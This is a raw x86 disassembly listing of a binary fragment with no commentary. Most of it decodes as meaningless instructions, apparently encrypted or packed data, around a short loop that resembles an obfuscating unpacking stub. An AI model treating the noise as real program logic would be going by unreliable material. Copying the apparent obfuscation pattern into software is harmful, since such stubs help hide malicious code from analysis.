  4087f2:	addr16 jle 0x40884f
  4087f5:	fwait
  4087f6:	xchg   ebp,eax
  4087f7:	shr    BYTE PTR [ecx+0x6c4e0ab7],1
  4087fd:	out    0xd2,eax
  4087ff:	clc    
  408800:	xlat   BYTE PTR ds:[ebx]
  408801:	cmp    esi,eax
  408803:	int    0x1f
  408805:	(bad)  
  408806:	pushf  
  408807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408808:	or     eax,0xa3c1dc4c
  40880d:	in     eax,0x81
  40880f:	inc    edx
  408810:	adc    al,0x0
  408812:	je     0x40886b
  408814:	jbe    0x408860
  408816:	push   eax
  408817:	out    dx,eax
  408818:	leave  
  408819:	and    ch,ah
  40881b:	sbb    eax,0xbd44f79a
  408820:	ja     0x408850
  408822:	jmp    0x4087ac
  408824:	aas    
  408825:	sbb    eax,DWORD PTR [ebx-0xeab82f3]
  40882b:	out    0x51,eax
  40882d:	pusha  
  40882e:	mov    al,ds:0x4b3800f7
  408833:	sbb    DWORD PTR [edx+0xf41fd97],ebp
  408839:	jmp    0x4ceb3aa1
  40883e:	fnstenv [ebx+0x2bba59f4]
  408844:	in     al,0x42
  408846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408848:	iret   
  408849:	fdiv   DWORD PTR [eax]
  40884b:	and    ah,BYTE PTR [edi-0x3f860738]
  408851:	shl    ah,1
  408853:	jmp    0x408823
  408855:	sbb    BYTE PTR [ebx],ch
  408857:	xchg   ecx,eax
  408858:	ret    
  408859:	inc    edx
  40885a:	fnclex 
  40885c:	rol    DWORD PTR [esp+eax*4-0x7b],0x2b
  408861:	call   FWORD PTR [ecx]
  408863:	pop    ds
  408864:	ret    
  408865:	inc    esi
  408866:	cmp    ah,BYTE PTR [edx-0xa38a3e3]
  40886c:	xchg   ebx,eax
  40886d:	rcr    dh,cl
  40886f:	adc    dh,ch
  408871:	dec    edi
  408872:	repnz inc edi
  408874:	dec    esp
  408875:	xchg   esp,eax
  408876:	out    0xe5,al
  408878:	(bad)  [edi-0x68]
  40887b:	cwde   
  40887c:	jb     0x408875
  40887e:	scas   eax,DWORD PTR es:[edi]
  40887f:	adc    al,BYTE PTR [edi]
  408881:	sub    al,0x34
  408883:	addr16 jbe 0x408886
  408886:	test   eax,0x2cc6c125
  40888b:	in     al,0x9e
  40888d:	adc    BYTE PTR [ebp+0x37249c8a],bh
  408893:	cmp    eax,0xa386b73
  408898:	xor    DWORD PTR [ecx-0x18],0xfffffffe
  40889c:	pop    esi
  40889d:	call   0x5097:0x1b9f94e5
  4088a4:	push   edx
  4088a5:	or     BYTE PTR [esi+0x71],cl
  4088a8:	lds    edx,FWORD PTR [edi+ebp*8-0x35b6a763]
  4088af:	and    DWORD PTR ds:0x53ba73ed,ebp
  4088b5:	xchg   esi,eax
  4088b6:	sub    BYTE PTR [ebx-0x20],ch
  4088b9:	repz ja 0x408842
  4088bc:	mov    ds:0x325a718d,al
  4088c1:	xor    BYTE PTR [edx],al
  4088c3:	popa   
  4088c4:	and    al,0x87
  4088c6:	add    eax,0x11720b7
  4088cb:	dec    esp
  4088cc:	pop    ebx
  4088cd:	les    ebp,FWORD PTR [esi-0x28]
  4088d0:	pop    es
  4088d1:	inc    ebx
  4088d2:	xchg   ebp,eax
  4088d3:	das    
  4088d4:	and    al,0x26
  4088d6:	push   esi
  4088d7:	stos   DWORD PTR es:[edi],eax
  4088d8:	push   0xffffffeb
  4088da:	enter  0xecf0,0xa
  4088de:	jg     0x4088a3
  4088e0:	inc    edx
  4088e1:	fisub  WORD PTR [ebx-0x5b4c977]
  4088e7:	mov    ds:0x3978b5b7,eax
  4088ec:	sub    BYTE PTR [ebx+0x4506b639],dl
  4088f2:	xlat   BYTE PTR ds:[ebx]
  4088f3:	nop/reserved BYTE PTR [ecx-0x2]
  4088f7:	sbb    BYTE PTR [esp+edx*2-0x64566416],dl
  4088fe:	mov    al,0xf4
  408900:	pop    ds
  408901:	retf   
  408902:	cdq    
  408903:	mov    ds:0x9c129ae5,al
  408908:	rcr    DWORD PTR [di],1
  40890b:	mov    dh,0xa8
  40890d:	fld    st(1)
  40890f:	cld    
  408910:	dec    edx
  408911:	jp     0x40893f
  408913:	cld    
  408914:	stos   DWORD PTR es:[edi],eax
  408915:	lods   eax,DWORD PTR ds:[esi]
  408916:	fbld   TBYTE PTR [edi]
  408918:	loope  0x4088de
  40891a:	retf   
  40891b:	adc    eax,0xaaaac42
  408920:	xchg   ebp,eax
  408921:	jmp    0x6d76:0xc262c4ac
  408928:	add    eax,0x2635eea6
  40892d:	add    DWORD PTR [edx],0xca393d25
  408933:	inc    ebx
  408934:	leave  
  408935:	pop    eax
  408936:	pop    ebp
  408937:	test   DWORD PTR [ebp-0x1c],esp
  40893a:	imul   ebx,ecx,0x73
  40893d:	jmp    0xbc765f12
  408942:	xchg   ebp,eax
  408943:	daa    
  408944:	aad    0xc9
  408946:	mov    esi,DWORD PTR [esi+0x3ce675c2]
  40894c:	lea    ecx,es:[edx-0xd2676b2]
  408953:	int3   
  408954:	int3   
  408955:	or     al,0x99
  408957:	mov    bl,0x31
  408959:	rcl    DWORD PTR [ebx],cl
  40895b:	(bad)  [edx+0xbaf5899]
  408961:	jmp    0x4088f6
  408963:	xor    al,ah
  408965:	xchg   ebx,eax
  408966:	cmp    ecx,ebx
  408968:	mov    ah,0x0
  40896a:	mov    ebp,0x40ae1e7d
  40896f:	mov    eax,ds:0xffa14aba
  408974:	add    al,0x5a
  408976:	out    0x9f,eax
  408978:	add    dl,BYTE PTR [ebp+0x42]
  40897b:	enter  0x9d92,0xce
  40897f:	icebp  
  408980:	jns    0x40893e
  408982:	inc    edx
  408983:	pop    ss
  408984:	push   edi
  408985:	ror    DWORD PTR [esi+ebx*1],cl
  408988:	fcom   DWORD PTR [esi]
  40898a:	ins    BYTE PTR es:[edi],dx
  40898b:	arpl   WORD PTR [edx+edx*1-0x1],dx
  40898f:	sub    esp,0xfdffd4ba
  408995:	dec    ecx
  408996:	outs   dx,DWORD PTR ds:[esi]
  408997:	xor    al,0xde
  408999:	sahf   
  40899a:	sub    dh,bl
  40899c:	push   0xffffffda
  40899e:	jmp    0x9dfbc61d
  4089a3:	in     eax,0xb5
  4089a5:	dec    edi
  4089a6:	imul   ebx,DWORD PTR [edx-0x80],0x38
  4089aa:	out    dx,eax
  4089ab:	clc    
  4089ac:	xchg   edi,eax
  4089ad:	lahf   
  4089ae:	mov    eax,ds:0x7711de2b
  4089b3:	leave  
  4089b4:	mov    edi,0xf045ab64
  4089b9:	cdq    
  4089ba:	pop    ss
  4089bb:	pop    eax
  4089bc:	mov    ecx,0x7677a5f3
  4089c1:	sub    al,0x95
  4089c3:	out    0xc9,eax
  4089c5:	pushf  
  4089c6:	gs jno 0x408a2d
  4089c9:	xchg   edi,eax
  4089ca:	xchg   edi,eax
  4089cb:	les    esi,FWORD PTR [esi]
  4089cd:	iret   
  4089ce:	mov    edx,DWORD PTR [eax]
  4089d0:	lods   al,BYTE PTR ds:[esi]
  4089d1:	mov    ebx,ss
  4089d3:	test   al,0x81
  4089d5:	shl    ebp,1
  4089d7:	lahf   
  4089d8:	fcomp  DWORD PTR [edi+esi*2+0x5a0acb48]
  4089df:	dec    edx
  4089e0:	push   edx
  4089e1:	mov    cl,0x7b
  4089e3:	cmp    BYTE PTR [ebx-0xbe40e09],bh
  4089e9:	cld    
  4089ea:	icebp  
  4089eb:	popf   
  4089ec:	inc    ebx
  4089ed:	mov    DWORD PTR [edx+0x1ace2613],edi
  4089f3:	mov    ch,0xf8
  4089f5:	xor    eax,0x87a5323e
  4089fa:	pop    es
  4089fb:	adc    eax,0x97d8ba83
  408a00:	push   es
  408a01:	push   ebp
  408a02:	and    al,0x6a
  408a04:	adc    al,0x2c
  408a06:	and    DWORD PTR [edi+esi*1],esp
  408a09:	jae    0x4089d4
  408a0b:	adc    BYTE PTR [eax+0x63293729],0xf0
  408a12:	call   0x90a0:0xc3c94949
  408a19:	pop    eax
  408a1a:	xor    BYTE PTR fs:[ebp-0x15],0x39
  408a1f:	dec    ebx
  408a20:	lahf   
  408a21:	and    ecx,DWORD PTR [edx+0x53fc2c75]
  408a27:	nop
  408a28:	jle    0x408a6b
  408a2a:	adc    eax,0x3c9dca26
  408a2f:	imul   eax,DWORD PTR [ebp-0x7a],0xffffffa7
  408a33:	stc    
  408a34:	jg     0x408a76
  408a36:	push   ds
  408a37:	and    eax,0x16795182
  408a3c:	gs adc al,0xbe
  408a3f:	int    0x85
  408a41:	imul   ecx,DWORD PTR [edx-0x3bb4de79],0x25
  408a48:	es cli 
  408a4a:	jp     0x4089f1
  408a4c:	(bad)  
  408a4d:	sar    BYTE PTR [eax],cl
  408a4f:	jnp    0x408aaa
  408a51:	outs   dx,BYTE PTR ds:[esi]
  408a52:	iret   
  408a53:	gs mov ebx,0x440f7986
  408a59:	je     0x408a50
  408a5b:	imul   dh
  408a5d:	mov    edx,DWORD PTR [ebx+0x4e]
  408a60:	xor    al,0xfe
  408a62:	fbstp  TBYTE PTR ds:0x9cc54d80
  408a68:	call   0x33fd:0x9aca3909
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xe9b3a4f9
  408a92:	adc    al,0x35
  408a94:	push   ecx
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408a26
  408a9e:	std    
  408a9f:	ja     0x408a75
  408aa1:	jb     0x408a58
  408aa3:	xor    BYTE PTR [edx-0x63],bl
  408aa6:	repnz fstp QWORD PTR [ebx+0x2280813c]
  408aad:	xlat   BYTE PTR ds:[ebx]
  408aae:	sti    
  408aaf:	ins    BYTE PTR es:[edi],dx
  408ab0:	imul   ebx,DWORD PTR [edi+eax*1-0x77],0xffffff9c
  408ab5:	scas   eax,DWORD PTR es:[edi]
  408ab6:	pop    esi
  408ab7:	mov    edx,0x71cd54b8
  408abc:	push   ebp
  408abd:	pop    edx
  408abe:	add    eax,0xa9e3bc12
  408ac3:	xchg   esp,eax
  408ac4:	mov    esp,0x5a7f17f
  408ac9:	dec    ecx
  408aca:	icebp  
  408acb:	xor    eax,0x695164d5
  408ad0:	mov    BYTE PTR [eax-0x27e64deb],bh
  408ad6:	dec    edx
  408ad7:	out    0x12,eax
  408ad9:	je     0x408ae7
  408adb:	sbb    BYTE PTR [edi+0x3d],0xd7
  408adf:	ja     0x408a88
  408ae1:	rcr    BYTE PTR [ebp-0x29],cl
  408ae4:	inc    esp
  408ae5:	sbb    eax,0x93574c67
  408aea:	das    
  408aeb:	or     bl,BYTE PTR [edi+ebp*2]
  408aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aef:	mov    al,0xd7
  408af1:	daa    
  408af2:	jae    0x408b1e
  408af4:	lea    ebx,[esp+ecx*2]
  408af7:	adc    al,0x6d
  408af9:	sbb    dh,ah
  408afb:	stc    
  408afc:	push   ss
  408afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408afe:	push   esp
  408aff:	jmp    0xe21e47b6
  408b04:	inc    eax
  408b05:	ds mov bl,0xc6
  408b08:	mov    esp,DWORD PTR [ebx+edi*2]
  408b0b:	out    0x72,al
  408b0d:	in     al,dx
  408b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b0f:	les    esp,FWORD PTR [esi-0x4f3cd818]
  408b15:	fisub  WORD PTR [edx]
  408b17:	repz cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408b1a:	add    bh,BYTE PTR [ecx-0x17110d2c]
  408b20:	pop    eax
  408b21:	adc    edx,ebp
  408b23:	rol    BYTE PTR [ebx-0x4ce00d62],0xd1
  408b2a:	jnp    0x408b4c
  408b2c:	xchg   esp,eax
  408b2d:	loope  0x408b31
  408b2f:	shl    BYTE PTR es:[eax+0x5aabe52a],cl
  408b36:	pushf  
  408b37:	inc    esi
  408b38:	push   0xffffffdf
  408b3a:	ss scas al,BYTE PTR es:[edi]
  408b3c:	into   
  408b3d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408b3f:	and    al,BYTE PTR [edx-0x611a96d2]
  408b45:	xchg   ecx,eax
  408b46:	ret    
  408b47:	cmp    eax,0x16961f64
  408b4c:	xchg   esi,eax
  408b4d:	pop    ecx
  408b4e:	es inc edi
  408b50:	add    esi,eax
  408b52:	dec    ecx
  408b53:	sub    eax,0x2e0a8d3a
  408b58:	xor    edx,DWORD PTR [edi+0x1bfba944]
  408b5e:	test   DWORD PTR [edi-0x26],eax
  408b61:	adc    al,0x48
  408b63:	xlat   BYTE PTR ds:[ebx]
  408b64:	fnstenv [eax]
  408b66:	jne    0x408b8b
  408b68:	inc    esp
  408b69:	aad    0x17
  408b6b:	adc    eax,0x6b82c560
  408b70:	int    0xbc
  408b72:	pop    ebp
  408b73:	and    eax,0xd6dee042
  408b78:	ss std 
  408b7a:	int    0xe
  408b7c:	imul   ebp,DWORD PTR [edx+0x5cd19c],0x53
  408b83:	pop    ebp
  408b84:	aaa    
  408b85:	daa    
  408b86:	jo     0x408b8d
  408b88:	pop    eax
  408b89:	inc    ecx
  408b8b:	retf   
  408b8c:	int    0x58
  408b8e:	push   0xd2d83ee9
  408b93:	lahf   
  408b94:	adc    al,BYTE PTR [esi-0x7c]
  408b97:	jg     0x408b3e
  408b99:	xor    eax,0xea52a910
  408b9e:	adc    edi,DWORD PTR [edi-0xf]
  408ba1:	dec    esi
  408ba2:	call   0xe566:0xfeee0486
  408ba9:	icebp  
  408baa:	clc    
  408bab:	arpl   WORD PTR [edx],bx
  408bad:	ret    0x1779
  408bb0:	das    
  408bb1:	jo     0x408be7
  408bb3:	fnstenv [ecx]
  408bb5:	test   DWORD PTR [ebx+edx*8+0x55eb72ef],edx
  408bbc:	js     0x408b5a
  408bbe:	xchg   esp,eax
  408bbf:	enter  0x3088,0x39
  408bc3:	xor    dl,BYTE PTR [ebx+0x4d5c85c0]
  408bc9:	mov    ecx,DWORD PTR [eax+0x23e53912]
  408bcf:	jmp    0x408bb3
  408bd1:	jg     0x408bd2
  408bd3:	pop    ebp
  408bd4:	adc    eax,0xcde6270b
  408bd9:	mov    ecx,0x69401a89
  408bde:	inc    esi
  408bdf:	xchg   ecx,eax
  408be0:	xchg   edx,eax
  408be1:	push   ss
  408be2:	adc    al,BYTE PTR [edx]
  408be4:	shl    bh,1
  408be6:	jb     0x408b9e
  408be8:	int    0xf5
  408bea:	maxps  xmm5,xmm3
  408bed:	(bad)  
  408bee:	or     al,0xd4
  408bf0:	fs pop edi
  408bf2:	pop    ecx
  408bf3:	mov    edx,DWORD PTR [edx-0x42c607b3]
  408bf9:	and    al,0x45
  408bfb:	imul   ebx,DWORD PTR [esi-0x48f6818],0xba6a0821
  408c05:	inc    edx
  408c06:	mov    eax,0x6a98f7ca
  408c0b:	pop    esi
  408c0c:	sub    BYTE PTR [eax+0x51],al
  408c0f:	repz repnz mov ch,ch
  408c13:	lea    esp,[edi-0x8efbe71]
  408c19:	sahf   
  408c1a:	push   esi
  408c1b:	mov    edi,0xc8e8c803
  408c20:	test   BYTE PTR [eax-0x5f],cl
  408c23:	repnz in eax,dx
  408c25:	adc    cl,BYTE PTR [edi]
  408c27:	push   esi
  408c28:	mov    edi,0xd927182d
  408c2d:	(bad)  [eax]
  408c2f:	xchg   edi,eax
  408c30:	sar    BYTE PTR [esi-0x63baa69d],1
  408c36:	add    dh,BYTE PTR [esi+0xd]
  408c39:	in     al,dx
  408c3a:	popf   
  408c3b:	jae    0x408c0b
  408c3d:	jecxz  0x408c71
  408c3f:	loope  0x408c8e
  408c41:	int    0xe2
  408c43:	push   esi
  408c44:	outs   dx,DWORD PTR ds:[esi]
  408c45:	imul   esp,edi,0x403e31e6
  408c4b:	lods   eax,DWORD PTR ds:[esi]
  408c4c:	jge    0x408c04
  408c4e:	push   edi
  408c4f:	inc    ebp
  408c50:	pushf  
  408c51:	out    dx,eax
  408c52:	pop    eax
  408c53:	ret    0x9df3
  408c56:	jne    0x408c43
  408c58:	in     eax,0xd4
  408c5a:	imul   ecx,DWORD PTR [edi-0x78],0x65e71132
  408c61:	push   eax
  408c62:	cli    
  408c63:	inc    edx
  408c64:	enter  0xca55,0x79
  408c68:	and    al,0xce
  408c6a:	add    BYTE PTR [edx+0x3e698f64],dl
  408c70:	sub    edi,DWORD PTR [eax+0x27d699e1]
  408c76:	and    DWORD PTR [ebp+0x4999932f],esi
  408c7c:	adc    bl,ah
  408c7e:	cli    
  408c7f:	sub    bl,dh
  408c81:	pushf  
  408c82:	test   DWORD PTR [esi+edx*2+0x73],ecx
  408c86:	xchg   edx,eax
  408c87:	jno    0x408caf
  408c89:	add    al,0x9e
  408c8b:	gs push 0xffffffec
  408c8e:	inc    esp
  408c8f:	test   DWORD PTR ds:0x56262e30,edi
  408c95:	or     eax,0x19c97a0
  408c9a:	std    
  408c9b:	cs fwait
  408c9d:	mov    ds:0x9dc0c8d7,al
  408ca2:	repz cmp DWORD PTR [esi-0x25],edi
  408ca6:	int3   
  408ca7:	cmp    al,BYTE PTR [eax+ebx*2+0x1]
  408cab:	mov    al,ds:0xe66713ab
  408cb0:	jmp    0x216f9426
  408cb5:	push   edx
  408cb6:	inc    edi
  408cb7:	dec    esp
  408cb8:	cs xor al,0xeb
  408cbb:	jnp    0x408c4f
  408cbd:	push   ds
  408cbe:	out    0xfd,eax
  408cc0:	push   esp
  408cc1:	or     al,0xac
  408cc3:	xchg   BYTE PTR ds:0xad5c4b83,ah
  408cc9:	mov    DWORD PTR [ecx-0x558715aa],ebx
  408ccf:	or     eax,0xf4b8ce1a
  408cd4:	pop    ecx
  408cd5:	fisubr DWORD PTR [ebx]
  408cd7:	fsubr  QWORD PTR [ebx]
  408cd9:	loop   0x408c69
  408cdb:	test   DWORD PTR [edx+0x62],0xb33603f6
  408ce2:	xchg   ebp,eax
  408ce3:	retf   0x5686
  408ce6:	sub    al,0xf0
  408ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce9:	sti    
  408cea:	dec    esp
  408ceb:	mov    ebp,0x19083ca4
  408cf0:	xor    edx,ebp
  408cf2:	push   0xf1d77ab7
  408cf7:	jne    0x408d1e
  408cf9:	arpl   cx,bx
  408cfb:	dec    eax
  408cfc:	imul   ebx,DWORD PTR [esi],0x3a52ab34
  408d02:	pop    edi
  408d03:	iret   
  408d04:	imul   ebx,ebx,0x791d8d07
  408d0a:	ror    BYTE PTR [edi-0x6511c9f2],cl
  408d10:	imul   esp,DWORD PTR [eax-0x69],0x1381d3b1
  408d17:	out    0x66,eax
  408d19:	scas   eax,DWORD PTR es:[edi]
  408d1a:	add    DWORD PTR [edi-0x52],ecx
  408d1d:	mov    al,0xa8
  408d1f:	sbb    BYTE PTR [edx+eiz*1-0x4d],0xdd
  408d24:	jns    0x408cab
  408d26:	ins    BYTE PTR es:[edi],dx
  408d27:	xchg   esp,eax
  408d28:	or     DWORD PTR [ecx-0xc],ebp
  408d2b:	sub    BYTE PTR [eax],0x63
  408d2e:	push   edi
  408d2f:	je     0x408d14
  408d31:	arpl   WORD PTR [ebx+0x7e],di
  408d34:	je     0x408cde
  408d36:	gs xchg esi,eax
  408d38:	lock inc ebp
  408d3a:	xchg   ebp,eax
  408d3b:	push   0xa22b42a7
  408d40:	mov    edx,0xaf1d0eaf
  408d45:	add    al,bh
  408d47:	inc    ebp
  408d48:	clc    
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0x26
  408e1d:	popf   
  408e1e:	jae    0x408e0e
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	retf   0xb2
  408e2b:	ins    DWORD PTR es:[edi],dx
  408e2c:	jbe    0x408ded
  408e2e:	fnstenv [ecx-0x31106f8f]
  408e34:	lahf   
  408e35:	push   esp
  408e36:	and    al,0x4b
  408e38:	mov    esp,0x2f1f56f5
  408e3d:	fisub  DWORD PTR [esi+0x637e87dc]
  408e43:	dec    esi
  408e44:	xchg   ebx,eax
  408e45:	xlat   BYTE PTR ds:[ebx]
  408e46:	sub    ebp,DWORD PTR [edx+esi*4]
  408e49:	inc    esi
  408e4a:	cwde   
  408e4b:	jae    0x408e4d
  408e4d:	and    eax,0x14a9ef3b
  408e52:	mov    esp,0xfcb9ebb4
  408e57:	mov    cl,0x0
  408e59:	pop    ds
  408e5a:	sub    eax,0xa8c4b3b1
  408e5f:	adc    ebx,DWORD PTR [edi+0x54]
  408e62:	jo     0x408ed3
  408e64:	mov    dl,0x0
  408e66:	sbb    BYTE PTR [ebp+0x22adb5bd],al
  408e6c:	jmp    DWORD PTR [edx+0x6138ca93]
  408e72:	and    edx,DWORD PTR [esi]
  408e74:	cmp    ch,BYTE PTR [edi+ebx*8+0x4af53603]
  408e7b:	jae    0x408ed7
  408e7d:	retf   0x483c
  408e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e81:	sbb    BYTE PTR [esi+0x2a],dh
  408e84:	mov    ds:0xd0b3be8b,al
  408e89:	cmp    DWORD PTR [esi+edx*4+0x53248dad],ecx
  408e90:	add    al,0x3b
  408e92:	out    dx,al
  408e93:	or     eax,0x77a95b24
  408e98:	out    0x78,eax
  408e9a:	sbb    DWORD PTR [eax+0x36],esp
  408e9d:	dec    eax
  408e9e:	loopne 0x408ef5
  408ea0:	mov    al,BYTE PTR [edi+0x672beb59]
  408ea6:	dec    esp
  408ea7:	push   esi
  408ea8:	adc    al,BYTE PTR [esi-0x69829dfb]
  408eae:	jecxz  0x408e65
  408eb0:	xchg   edx,eax
  408eb1:	mov    eax,ds:0x2558a32c
  408eb6:	sub    BYTE PTR [ebx+0x671f6399],al
  408ebc:	(bad)  
  408ebd:	mov    eax,ds:0x97182f7e
  408ec2:	mov    bl,0xe7
  408ec4:	push   esp
  408ec5:	hlt    
  408ec6:	ja     0x408f35
  408ec8:	adc    ah,bl
  408eca:	sub    eax,ebp
  408ecc:	xchg   edi,eax
  408ecd:	ret    0x2312
  408ed0:	mov    ds:0xef36537,eax
  408ed5:	out    0x3d,eax
  408ed7:	fidivr DWORD PTR [ecx]
  408ed9:	push   cs
  408eda:	ins    BYTE PTR es:[edi],dx
  408edb:	or     esi,0xc71ba2a9
  408ee1:	mov    esi,DWORD PTR [eax+ecx*2+0x479a43b1]
  408ee8:	cmp    cl,BYTE PTR [ecx+0x4a]
  408eeb:	das    
  408eec:	fmul   DWORD PTR [ebx+eax*4]
  408eef:	xlat   BYTE PTR ds:[ebx]
  408ef0:	not    DWORD PTR [ebx-0x77]
  408ef3:	rcr    bh,1
  408ef5:	jmp    0xd7f76dc1
  408efa:	cmp    bl,bh
  408efc:	xchg   ecx,eax
  408efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408efe:	fs jecxz 0x408f15
  408f01:	add    edi,DWORD PTR [ecx]
  408f03:	sbb    edi,0x93bd92d
  408f09:	mov    ch,dh
  408f0b:	cwde   
  408f0c:	pop    edi
  408f0d:	dec    edi
  408f0e:	enter  0x58e9,0xbf
  408f12:	rcr    DWORD PTR [ebp-0x51c71d83],0xa3
  408f19:	and    ebx,DWORD PTR [ebx+0x3f]
  408f1c:	or     ebx,DWORD PTR [ebx+ebx*8-0x73]
  408f20:	leave  
  408f21:	ins    BYTE PTR es:[edi],dx
  408f22:	or     al,bl
  408f24:	jge    0x408f87
  408f26:	or     esp,DWORD PTR [ecx-0x79]
  408f29:	jo     0x408ec3
  408f2b:	and    DWORD PTR [edi+0x76f8d123],edx
  408f31:	enter  0xd917,0x54
  408f35:	pop    eax
  408f36:	(bad)  [edi]
  408f38:	mov    ecx,cr1
  408f3b:	xchg   ebp,eax
  408f3c:	ins    DWORD PTR es:[edi],dx
  408f3d:	pop    es
  408f3e:	and    BYTE PTR [ebp-0x32],bl
  408f41:	push   es
  408f42:	pop    es
  408f43:	clc    
  408f44:	and    cl,cl
  408f46:	push   0xceefbb32
  408f4b:	mov    esi,0xea8e3b04
  408f50:	fcomip st,st(3)
  408f52:	pop    ss
  408f53:	(bad)  
  408f54:	sub    bl,dh
  408f56:	pop    edx
  408f57:	add    al,0xad
  408f59:	sti    
  408f5a:	imul   edx,DWORD PTR [ecx-0x49e68020],0xa
  408f61:	push   0xff4a1832
  408f66:	outs   dx,BYTE PTR ds:[esi]
  408f67:	test   DWORD PTR [ebx+0x8],ebx
  408f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f6b:	and    eax,DWORD PTR [edx+0x7777c796]
  408f71:	or     eax,0xf24385c1
  408f76:	sbb    eax,0x9a7c367d
  408f7b:	inc    ebp
  408f7c:	adc    esi,DWORD PTR [eax-0x518592ee]
  408f82:	addr16 jl 0x408fae
  408f85:	nop
  408f86:	cwde   
  408f87:	add    BYTE PTR [edi],ch
  408f89:	scas   eax,DWORD PTR es:[edi]
  408f8a:	cmp    eax,0x9039c01
  408f8f:	push   edi
  408f90:	inc    esi
  408f91:	cmc    
  408f92:	and    ebx,DWORD PTR [edi]
  408f94:	pushf  
  408f95:	lods   eax,DWORD PTR ds:[esi]
  408f96:	repnz pusha 
  408f98:	sub    al,0x30
  408f9a:	out    0x12,al
  408f9c:	pop    ecx
  408f9d:	mov    ch,0x41
  408f9f:	sahf   
  408fa0:	pop    edx
  408fa1:	pop    ecx
  408fa2:	sbb    al,BYTE PTR [edi-0x3e]
  408fa5:	fcom   QWORD PTR [edi+0xb]
  408fa8:	push   edi
  408fa9:	outs   dx,DWORD PTR ds:[esi]
  408faa:	popf   
  408fab:	fdiv   DWORD PTR [ebx+0x3b]
  408fae:	inc    eax
  408faf:	jmp    0x69e3cd37
  408fb4:	out    0x1e,eax
  408fb6:	es (bad) 
  408fb8:	mov    al,ds:0x71e0bb6b
  408fbd:	daa    
  408fbe:	in     al,dx
  408fbf:	stos   DWORD PTR es:[edi],eax
  408fc0:	cmp    eax,0xddc98c5
  408fc5:	popa   
  408fc6:	xor    eax,DWORD PTR [esi]
  408fc8:	(bad)  
  408fc9:	mov    esi,0x92bef23f
  408fce:	xchg   edi,eax
  408fcf:	sub    al,0xe7
  408fd1:	xchg   esi,eax
  408fd2:	push   ss
  408fd3:	xchg   DWORD PTR [ebx+0x4e],ecx
  408fd6:	arpl   WORD PTR [esi+ecx*2+0x7c],di
  408fda:	and    al,0xb0
  408fdc:	jg     0x408f84
  408fde:	ret    0xec6f
  408fe1:	and    al,0x4d
  408fe3:	dec    ecx
  408fe4:	add    ebp,ebp
  408fe6:	push   esi
  408fe7:	cmp    DWORD PTR ds:0x876baead,ecx
  408fed:	fistp  WORD PTR [ebp-0xe839df9]
  408ff3:	xlat   BYTE PTR ds:[ebx]
  408ff4:	loop   0x409064
  408ff6:	pop    ss
  408ff7:	(bad)  
  408ff8:	ror    DWORD PTR ds:0xb2ec53a8,1
  408ffe:	call   0xa39157e6
  409003:	mov    ch,0xa4
  409005:	(bad)  
  409006:	cs sbb eax,eax
  409009:	xchg   esi,eax
  40900a:	inc    ebp
  40900b:	xor    edi,DWORD PTR [edx+0x71]
  40900e:	ins    BYTE PTR es:[edi],dx
  40900f:	mov    al,0xe1
  409011:	shl    DWORD PTR [ecx+0x1c6c3b09],cl
  409017:	out    dx,al
  409018:	lods   al,BYTE PTR ds:[esi]
